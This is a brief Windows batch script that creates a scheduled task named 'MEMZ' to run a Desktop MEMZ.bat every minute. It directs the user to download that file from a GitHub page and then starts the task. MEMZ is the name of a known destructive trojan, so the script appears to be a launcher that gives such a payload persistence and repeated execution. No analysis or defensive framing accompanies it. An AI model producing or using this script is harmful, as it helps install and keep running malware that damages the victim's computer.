@echo off

:menu
echo Have you already made this task?
echo Y/N
echo.
echo.


set /p menuchoice=

if %menuchoice% == Y goto launch
if %menuchoice% == N goto create
cls
goto menu


:create
cls
SCHTASKS /CREATE /SC MINUTE /TN "MEMZ" /TR C:\Users\vplan\Desktop\MEMZ.bat /F
goto launch



:launch
echo The tasks now on you, please download MEMZ.bat from the website that will now open in your browser.
start https://www.github.com/18209550/
echo Once Downloaded, press any key to continue.
pause >nul
SCHTASKS /run /tn "MEMZ"